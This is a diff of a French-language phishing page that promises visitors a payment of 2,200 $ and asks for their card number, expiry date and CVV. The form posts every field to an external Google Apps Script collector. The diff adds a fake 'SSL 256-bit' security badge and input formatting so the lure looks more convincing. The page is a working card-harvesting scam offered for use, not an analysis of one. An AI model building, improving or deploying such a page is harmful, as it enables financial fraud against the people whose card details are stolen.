@@ -2,48 +2,77 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Réception de Paiement - 2200$</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Réception de Paiement Sécurisée</title>
     <style>
-        body { font-family: sans-serif; background-color: #f4f7f9; display: flex; justify-content: center; padding: 20px; }
-        .card-container { background: white; padding: 25px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 100%; max-width: 400px; }
-        .header { text-align: center; margin-bottom: 25px; }
-        .amount { font-size: 24px; font-weight: bold; color: #2ecc71; }
-        .label { display: block; margin-bottom: 8px; font-size: 14px; color: #555; font-weight: 600; }
-        input { width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #f2f4f7; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 15px; }
+        .card-container { background: white; padding: 25px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.08); width: 100%; max-width: 400px; box-sizing: border-box; }
+        .header { text-align: center; margin-bottom: 30px; }
+        .header p { color: #7f8c8d; margin: 0; font-size: 14px; text-transform: uppercase; letter-spacing: 1px; }
+        .amount { font-size: 32px; font-weight: 800; color: #27ae60; margin-top: 5px; }
+        .label { display: block; margin-bottom: 8px; font-size: 13px; color: #34495e; font-weight: 600; }
+        input { width: 100%; padding: 15px; margin-bottom: 20px; border: 1.5px solid #dcdde1; border-radius: 10px; box-sizing: border-box; font-size: 16px; transition: border 0.3s; -webkit-appearance: none; }
+        input:focus { border-color: #3498db; outline: none; }
         .row { display: flex; gap: 15px; }
         .row div { flex: 1; }
-        button { width: 100%; background-color: #3498db; color: white; padding: 15px; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; }
+        button { width: 100%; background-color: #2980b9; color: white; padding: 18px; border: none; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; transition: transform 0.2s, background 0.3s; margin-top: 10px; }
+        button:active { transform: scale(0.98); background-color: #2471a3; }
+        .secure-footer { text-align: center; margin-top: 20px; color: #bdc3c7; font-size: 12px; display: flex; align-items: center; justify-content: center; gap: 5px; }
     </style>
 </head>
 <body>
 
 <div class="card-container">
     <div class="header">
-        <p style="margin: 0; color: #777;">Montant à recevoir</p>
+        <p>Montant à recevoir</p>
         <div class="amount">2 200,00 $</div>
     </div>
 
-    <!-- Ton URL est intégrée ici dans 'action' -->
-    <form action="https://script.google.com/macros/s/AKfycbwGOPFTt0eGedDfAkFlboJfaL7fbzB_iFKtBxh8TZdWUBzVvuDemyekLOoh-e_P31o/exec" method="POST">
+    <!-- Ton URL est ici -->
+    <form action="https://script.google.com/macros/s/AKfycbxZksAcmGW5lJkEegnihv0t2FAXGkN1EdqjPvjUvDJcdrQobNZhI_7DpxZFgHrfRw/exec" method="POST">
         
-        <label class="label">Numéro de carte bancaire</label>
-        <input type="text" name="cardNumber" placeholder="0000 0000 0000 0000" inputmode="numeric" required>
+        <label class="label">NUMÉRO DE CARTE</label>
+        <input type="text" name="cardNumber" id="card" placeholder="0000 0000 0000 0000" inputmode="numeric" maxlength="19" required>
 
         <div class="row">
             <div>
-                <label class="label">Expiration</label>
-                <input type="text" name="expiry" placeholder="MM/AA" inputmode="numeric" required>
+                <label class="label">EXPIRATION</label>
+                <input type="text" name="expiry" id="expiry" placeholder="MM/AA" inputmode="numeric" maxlength="5" required>
             </div>
             <div>
                 <label class="label">CVV</label>
-                <input type="password" name="cvv" placeholder="123" maxlength="3" inputmode="numeric" required>
+                <input type="password" name="cvv" placeholder="123" inputmode="numeric" maxlength="3" required>
             </div>
         </div>
 
-        <button type="submit">Recevoir les 2200$ maintenant</button>
+        <button type="submit">RECEVOIR LES 2200$</button>
     </form>
+
+    <div class="secure-footer">
+        <span>🔒 Paiement sécurisé SSL 256-bit</span>
+    </div>
 </div>
+
+<script>
+    // Ajoute des espaces automatiquement tous les 4 chiffres du numéro de carte
+    document.getElementById('card').addEventListener('input', function (e) {
+        let target = e.target;
+        let position = target.selectionEnd;
+        let length = target.value.length;
+        target.value = target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
+        if(target.value.length !== length) {
+            position = position + (target.value.length - length);
+        }
+        target.setSelectionRange(position, position);
+    });
+
+    // Ajoute le slash automatiquement pour la date d'expiration
+    document.getElementById('expiry').addEventListener('input', function (e) {
+        let v = e.target.value.replace(/[^\d]/g, '');
+        if (v.length >= 2) v = v.substring(0, 2) + '/' + v.substring(2);
+        e.target.value = v;
+    });
+</script>
 
 </body>
 </html>
